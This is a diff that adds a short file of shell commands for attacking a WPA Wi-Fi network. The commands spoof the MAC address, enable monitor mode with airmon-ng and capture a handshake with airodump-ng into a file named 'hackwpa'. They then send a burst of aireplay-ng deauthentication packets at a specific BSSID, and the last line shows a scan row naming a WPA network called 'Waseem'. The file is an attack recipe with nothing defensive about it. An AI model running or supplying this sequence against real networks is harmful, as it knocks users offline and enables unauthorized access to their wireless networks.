@@ -1,0 +1,17 @@
+ifconfig
+
+ifconfig wlan0 down
+macchanger -m 00:11:22:33:44:55 wlan0
+
+ifconfig wlan0 up
+iwconfig wlan0
+
+airmon-ng start wlan0
+
+iwconfig mon0
+airodump-ng mon0
+
+airodump-ng --bssid [bssid there] -c [channel-name there] -w hackwpa mon0
+
+sudo aireplay-ng -0 30 -a C8:3A:35:19:71:68 mon0
+ C8:3A:35:19:71:68    0        1        0    0   6  54e  WPA  CCMP   PSK  Waseem
